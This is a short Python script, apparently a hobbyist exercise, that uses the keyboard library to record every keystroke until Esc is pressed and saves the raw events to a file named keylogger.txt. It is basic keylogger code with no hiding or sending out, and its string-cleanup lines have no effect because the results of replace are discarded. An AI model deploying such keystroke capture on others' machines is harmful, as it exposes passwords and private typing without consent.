import keyboard
import os

recorded_keys = keyboard.record(until="Esc")




myString = ""
for elem in recorded_keys:
    myString = myString + str(elem) + " "

myString.replace("KeyboardEvent(","")
myString.replace(" down)","")
myString.replace(" up)","")

f = open("keylogger.txt", "x")
f.write(myString)




